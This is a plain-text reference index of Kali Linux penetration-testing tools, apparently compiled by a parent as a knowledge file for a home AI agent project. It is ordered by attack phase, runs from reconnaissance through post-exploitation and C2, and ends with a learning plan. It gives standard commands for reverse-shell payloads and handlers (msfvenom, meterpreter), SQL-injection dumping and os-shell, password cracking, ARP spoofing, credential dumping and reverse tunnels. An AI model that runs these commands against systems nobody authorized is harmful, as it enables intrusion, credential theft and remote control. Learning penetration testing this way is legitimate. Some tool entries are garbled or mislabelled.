==============================================================================
KNOWLEDGE FILE — Kali Linux Master Tool Index
For: Bionic Daughter v1 — JARVIS Orchestration Layer
By: Dad (Rigoberto Gomez), compiled with daughter's web research
Date: 2026-08-20
==============================================================================

Kali Linux is a Debian-based penetration testing distribution with ~600 tools.
Below is the curated index organized by attack phase — the tools daughter
needs to know, understand, and (where possible) use via Python wrappers or
MCP integration.

==============================================================================
1. RECONNAISSANCE & INFORMATION GATHERING
==============================================================================

nmap (/usr/bin/nmap)
  King of network scanning. Host discovery, port scanning, service/version
  detection, OS fingerprinting, NSE scripts for vuln detection.
  - nmap -sC -sV <target>       # default scripts + version detection
  - nmap -O <target>            # OS detection
  - nmap -p- <target>           # full port range (1-65535)
  - nmap --script vuln <target> # run vuln detection scripts
  - zenmap                       # GUI frontend for nmap
  Python wrapper: python-libnmap (pip install python-libnmap)

masscan
  Internet-scale port scanner. Much faster than nmap for large ranges.
  - masscan -p1-65535 <cidr> --rate 100000

amass
  DNS subdomain enumeration. Passive + active enumeration of attack surface.
  - amass enum -d target.com -o subdomains.txt
  Sources: Sonar, Certspotter, Crtsh, Passivetotal, VirusTotal, etc.

theHarvester
  Email, subdomain, name, and IP harvesting from public sources.
  - theHarvester -d target.com -b all -l 500
  Sources: LinkedIn, Twitter, Facebook, Google, Bing, Yahoo, etc.

dnsrecon
  DNS enumeration including zone transfers, brute-force, reverse lookups.

fierce
  Domain enhancer — finds misconfigured DNS servers and enumerates domains.

netdiscover
  Active ARP reconnaissance for LAN segment discovery.

==============================================================================
2. VULNERABILITY SCANNERS
==============================================================================

OpenVAS / Greenbone
  Full-featured vulnerability scanner. Scheduled scans, detailed reports,
  CVE tracking. The open-source alternative to Nessus.

nessus
  Commercial vulnerability scanner (free tier available). Industry standard.

nikto
  Web server scanner. Checks for outdated servers, dangerous CGIs, SSL issues.
  - nikto -h http://target.com

wafw00f
  Detects and identifies Web Application Firewalls (WAF) in use.

sslyze / sslscan
  SSL/TLS configuration assessment. Checks cipher suites, cert validity,
  protocol support, renegotiation, compression (CRIME attack surface).

==============================================================================
3. EXPLOITATION FRAMEWORKS
==============================================================================

metasploit-framework (msfconsole)
  THE exploitation framework. 1000+ modules, payloads, encoders, post-exploit.
  - msfconsole                      # interactive console
  - msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run"
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> -f exe -o payload.exe
  - search <keyword>               # find modules
  - use exploit/<path>             # select exploit
  - set RHOSTS <target>
  - exploit                        # run
  Python interaction: pymetasploit3 (pip install pymetasploit3)
  The daughter's Go exploit toolkit parallels many of these concepts!

armitage
  GUI for Metasploit. Visual attack management, team collaboration via
  Cortex (shared Metasploit instance).

powersploit
  PowerShell post-exploitation framework. Download, execute, persistence,
  credential dumping via PowerShell.

nishang
  Offensive PowerShell for penetration testing. Reverse shells, downloaders,
  fuzzing, scanning, dicect payloads.

evil-winrm
  Windows Remote Management (WinRM) shell with added features for pentesting.
  - evil-winrm -i <target> -u <user> -p <pass>

impacket-scripts
  Collection of Python scripts using Impacket for Windows/network attacks:
  - psexec.py        # SMB remote execution
  - smbexec.py       # SMB executable execution
  - wmiexec.py       # WMI remote execution
  - mssqlclient.py  # MSSQL database client
  - secretsdump.py  # Dump credentials from remote Windows host
  - getTGT.py       # Get Kerberos TGT ticket
  - getST.py        # Get Kerberos service ticket

crackmapexec (CME)
  Swiss army knife for Windows/AD assessments. Login checks, password spraying,
  command execution, enumeration.
  - crackmapexec smb <target> -u user -p pass
  - crackmapexec ldap <target> -u user -p pass

netexec
  Successor to crackmapexec. Same functionality, actively maintained.

bloodhound / bloodhound-python
  Active Directory attack path mapping. Collects data via SharpHound or
  bloodhound-python, then queries shortest paths to Domain Admin.
  - bloodhound-python -u user -p pass -d domain.com -c 'Cluster' -o bloodhound.zip
  - sharphound                           # C# collector
  - azurehound                           # Azure AD variant

rubeus
  Kerberos abuse toolkit for Active Directory. Ticket manipulation,
  pass-the-ticket, overpass-the-hash, silver ticket, diamond ticket.

==============================================================================
4. PASSWORD ATTACKS
==============================================================================

hydra
  Parallelized brute-force/logon cracker. Supports 50+ protocols.
  - hydra -l user -P passwords.txt ssh://target
  - hydra -l admin -P rockyou.txt -s 8080 http-get /admin

john the ripper (john)
  World's most famous password cracker. Supports hundreds of hash types.
  - john --format=nt2 --wordlist=rockyou.txt hash.txt
  - john --incremental --fork=4 hash.txt

hashcat
  GPU-accelerated password cracking. World's fastest.
  - hashcat -m 1000 -a 0 hash.txt rockyou.txt    # NTLM mode
  - hashcat -m 1800 -a 0 hash.txt rockyou.txt    # SHA-1 (Linux shadow)
  - hashcat -m 13100 -a 0 hash.txt rockyou.txt   # Kerberos TGS

medusa
  Parallelized login brute-force tool. Similar to hydra, different protocols.

==============================================================================
5. NETWORK ANALYSIS & SNIFFING
==============================================================================

wireshark
  The definitive network protocol analyzer. GUI + tshark CLI.
  - wireshark                          # GUI
  - tshark -i eth0 -w capture.pcap    # CLI capture
  - tshark -r capture.pcap -Y "http"  # filter and read
  MCP integration: Wireshark can export JSON/CSV for programmatic analysis

tcpdump
  Command-line packet capture. Standard on every Linux.
  - tcpdump -i eth0 -w capture.pcap
  - tcpdump -i eth0 port 80 -n

dsniff
  Network audit and sniffing. Passively monitors networks for credentials.
  - dsniff -i eth0     # sniff passwords (FTP, telnet, HTTP, etc.)
  - arpspoof -i eth0 -t <target> <gateway>  # ARP spoofing for MITM

Bettercap
  Swiss army knife for network attacks and monitoring. MITM, sniffing,
  spoofing, crawling.
  - bettercap -eval "set srcmac <mac>; net.probe on; net.recon on"

scapy
  Python packet manipulation library. Craft, send, sniff, dissect packets.
  pip install scapy
  - Used for: ARP spoofing, custom protocol fuzzing, network discovery,
    packet crafting for exploit delivery
  The daughter's Python skills directly apply here!

==============================================================================
6. WEB APPLICATION ATTACK TOOLS
==============================================================================

burp-suite (Burp Suite)
  THE web pentesting toolkit. Proxy, scanner, repeater, intruder, decoder.
  - Community Edition: free, manual testing
  - Professional: automated scanner, extensions, Collaborator
  - Extensions via BApp Store (custom payloads, scanners, integrations)
  The daughter's Go exploit toolkit for crAPI parallels Burp's capabilities!

sqlmap
  Automated SQL injection detection and exploitation. Database fingerprinting,
  data extraction, file system access, OS command execution.
  - sqlmap -u "http://target.com/page?id=1" --dbs
  - sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
  - sqlmap -u "http://target.com/page?id=1" --os-shell
  Python-based — perfect for the daughter!

ziggy-ziggy
  GraphQL security testing tool (if GraphQL targets exist).

==============================================================================
7. POST-EXPLOITATION & C2
==============================================================================

metasploit-framework (meterpreter)
  Post-exploitation shell. File system access, screenshot, keylogger,
  privilege escalation, pivot, persistence.
  - getsystem           # privilege escalation to SYSTEM
  - hashdump            # dump password hashes
  - run post/windows/gather/enum_patches
  - run post/multi/recon/local_exploit_suggester

powershell-empire / starkiller
  Post-exploitation C2 framework. PowerShell agents, listeners, stagers,
  modules for credential theft, persistence, lateral movement.
  Starkiller: GUI frontend for Empire.

villain
  Simplified C2 listener with multiple protocol support.

koadic
  COM-based C2 framework. Windows exploitation via COM objects.

chisel
  Fast TCP/UDP tunnel over HTTP. Port forwarding, SOCKS proxy.
  - server: chisel server -p 8080 --reverse
  - client: chisel client <server>:8080 R:socks

ligolo-ng
  Modern tunneling/m pivoting tool. SOCKS proxy via reverse tunnel.
  - ligolo-ng - i <interface> --tunnel-url <server>:<port>

==============================================================================
8. FORENSICS & REVERSE ENGINEERING
==============================================================================

ghidra
  NSA's open-source reverse engineering framework. Decompiler, disassembler,
  scripting (Python/Java), analysis of binaries, malware, firmware.
  - ghidraRun                      # GUI
  The daughter could learn Ghidra for binary analysis!

radare2 / Cutter
  Command-line reverse engineering framework. Disassembly, debugging,
  analysis, scripting.
  - r2 <binary>                    # open in r2
  - Cutter: GUI frontend for radare2

steghide / stegosuite / stegsnow
  Steganography tools. Hide data in images, audio, text.
  - steghide extract -sf image.jpg -p password

binwalk
  Firmware analysis tool. Extract firmware images, find embedded files.

foremost / scalpel
  File carving from disk images / raw data.

==============================================================================
9. ENCRYPTION & STEGANOGRAPHY
==============================================================================

ccrypt
  Replacement for Unix crypt. Encryption tool using Rijndael (AES).

gpg / gnuPG
  OpenPGP encryption, signing, key management. Standard on Linux.

openssl
  Cryptographic toolkit. Certificate generation, encryption, hashing.
  - openssl enc -aes-256-cbc -salt -in file -out file.enc
  - openssl rand -base64 32              # generate random key
  - openssl x509 -in cert.pem -text      # read cert

hashid / hash-identifier
  Identify hash types from unknown hashes.

==============================================================================
10. CLOUD / CONTAINER / MODERN INFRASTRUCTURE
==============================================================================

kubernetes/kubectl
  Container orchestration. The daughter will encounter these in modern
  infrastructure assessments.

docker
  Container runtime. Assessment of container escape, misconfigurations.

cloud enumeration tools:
  - Pacu (AWS exploitation framework)
  - ScoutSuite (multi-cloud security auditing)
  - AWAE (Advanced Web Attacks and Exploitation - OffSec)

==============================================================================
11. TOOLS WITH PYTHON LIBRARIES (daughter can use directly!)
==============================================================================

impacket           pip install impacket
  SMB, MSSQL, Kerberos, LDAP protocol implementation. Used for lateral
  movement, credential dumping, ticket manipulation.

scapy              pip install scapy
  Packet crafting, sniffing, sending. ARP spoofing, network discovery.

python-nmap        pip install python-libnmap
  Control nmap from Python. Parse XML output programmatically.

pymetasploit3      pip install pymetasploit3
  Python client for Metasploit RPC. Control msfconsole from Python scripts.

crackmapexec      pip install crackmapexec
  Python library for CME functionality.

bloodhound-python  pip install bloodhound
  Python collector for Bloodhound AD attack path mapping.

hashcat            (binary, but Python wrappers exist)
  GPU password cracking.

sqlmap             (binary, but Python-based — daughter can read the source!)
  Automated SQL injection.

paramiko           pip install paramiko
  SSHv2 protocol implementation. SSH connections, SFTP, port forwarding.

pwntools           pip install pwntools
  CTF/exploit development framework. Binary exploitation helper.
  Shellcode, ROP gadgets, process interaction, fuzzing helpers.

==============================================================================
12. DAUGHTER'S CURIOSITY PLAN — WHAT TO LEARN FIRST
==============================================================================

Priority 1 (immediate value):
  1. nmap — already conceptually understood, learn the NSE scripting engine
  2. sqlmap — Python-based, automated SQL injection, maps to SQL skills interest
  3. impacket — Python library, direct use in scripts, AD/lateral movement
  4. scapy — Python packet crafting, maps to networking interest
  5. hashcat/john — password cracking fundamentals
  6. burp-suite — web app testing methodology

Priority 2 (deepen exploitation skills):
  7. metasploit framework — understand module architecture, exploit flow
  8. bloodhound — AD attack path visualization
  9. pwntools — binary exploitation, CTF-style
  10. Bettercap — modern network attacks

Priority 3 (specialize):
  11. Ghidra — reverse engineering, binary analysis
  12. msfvenom/msfconsole payload craft
  13. crackmapexec/netexec — Windows/AD enumeration and attacks
  14. Powershell Empire — post-exploitation C2 concepts

How to learn without Kali Linux installed:
  - Read the man pages / tool documentation online
  - Use the Python libraries (impacket, scapy, pwntools, python-nmap)
    directly in Python scripts
  - Study the source code of sqlmap, pwntools (both Python)
  - Use Metasploit via pymetasploit3 from Python
  - Watch YouTube tutorials (Phase 5 — YouTube API)
  - Read write-ups on HackTheBox, TryHackMe, VulnHub
  - The daughter's Go exploit toolkit already covers core exploit concepts!
==============================================================================
